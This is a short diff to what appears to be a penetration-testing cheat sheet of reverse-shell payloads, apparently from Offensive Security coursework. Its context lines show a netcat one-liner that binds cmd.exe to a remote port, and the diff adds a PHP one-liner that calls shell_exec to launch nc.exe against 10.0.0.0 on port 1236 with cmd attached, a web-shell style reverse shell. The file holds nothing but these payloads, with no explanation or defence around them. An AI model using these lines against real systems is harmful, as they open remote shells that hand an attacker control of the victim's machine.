@@ -33,5 +33,6 @@ $output = system($cmd);
 ?>
 
 7. nc ip port -e C:\Windows\Systems32\cmd.exe
-
+8.
+<?php shell_exec('C:\Users\Offsec\Desktop\Tools\netcat\nc.exe -n 10.0.0.0 1236 -e cmd');?>
 
